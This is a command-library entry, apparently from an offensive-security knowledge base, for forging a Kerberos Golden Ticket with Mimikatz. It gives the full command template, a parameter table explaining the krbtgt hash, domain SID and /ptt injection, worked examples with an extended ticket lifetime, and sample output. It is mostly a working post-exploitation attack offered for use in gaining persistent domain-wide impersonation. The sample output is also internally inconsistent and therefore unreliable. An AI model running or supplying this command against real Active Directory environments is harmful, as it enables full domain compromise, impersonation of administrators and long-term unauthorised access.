---
id: 3c90d5d3-3f6c-4348-8e70-4f55eb77d78c
name: mimikatz-kerberos-golden-ticket
type: command
executor: powershell
data: >-
  .\mimikatz.exe "kerberos::golden /admin:$_ADMIN_USER /domain:$_DOMAIN_FQDN
  /sid:$_DOMAIN_SID /krbtgt:$_KRBTGT_HASH /ptt" exit
output: null
created_at: '2023-04-06T03:56:27.267616+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - golden-ticket
  - mimikatz
verified: true
validated: true
---

# mimikatz-kerberos-golden-ticket

## Command

```powershell
.\mimikatz.exe "kerberos::golden /admin:$_ADMIN_USER /domain:$_DOMAIN_FQDN /sid:$_DOMAIN_SID /krbtgt:$_KRBTGT_HASH /ptt" exit
```

## Description

This command uses Mimikatz to generate and inject a forged Kerberos Golden Ticket into the current session, enabling domain-wide impersonation of the specified user. It is used in post-exploitation for persistence and lateral movement in Active Directory environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ADMIN_USER | Username to impersonate (e.g., Administrator) | Yes |
| $_DOMAIN_FQDN | Fully qualified domain name (e.g., contoso.com) | Yes |
| $_DOMAIN_SID | Domain Security Identifier (e.g., S-1-5-21-xxx) | Yes |
| $_KRBTGT_HASH | NTLM hash of the KRBTGT account | Yes |
| /ptt | Inject ticket into current process for immediate use | Yes |
| /admin | Specifies the user principal for the ticket | Built-in |
| /domain | Specifies the target domain | Built-in |
| /sid | Specifies the domain SID | Built-in |
| /krbtgt | Specifies the KRBTGT hash for ticket encryption | Built-in |

## Examples

### Basic Usage

```powershell
.\mimikatz.exe "kerberos::golden /admin:Administrator /domain:contoso.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f678901234567890123456 /ptt" exit
```

### Advanced Usage with Custom Validity

```powershell
.\mimikatz.exe "kerberos::golden /admin:Administrator /domain:contoso.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f678901234567890123456 /startoffset:0 /endin:44640 /ptt" exit
```

## Expected Output

```
[-] Entry 'krbtgt' not found in current logon session -> no EXPORT possible
User : poshuser
Domain : WORKGROUP (null) (Classic/NT : Yes)
LogonId : 0x000003e7
Kerberos : Yes (Ticket(s) : 0)
NTLM : Yes
i : 0 -> No Cache Entries
* NEW TGT :
  * Ticket : ** PASS **
  * Exported to : golden.tgt
Kerberos::Golden done.
```

## Related

- [[procedures/Golden-Ticket-Generation-with-Mimikatz]]
- [[tools/Mimikatz]]
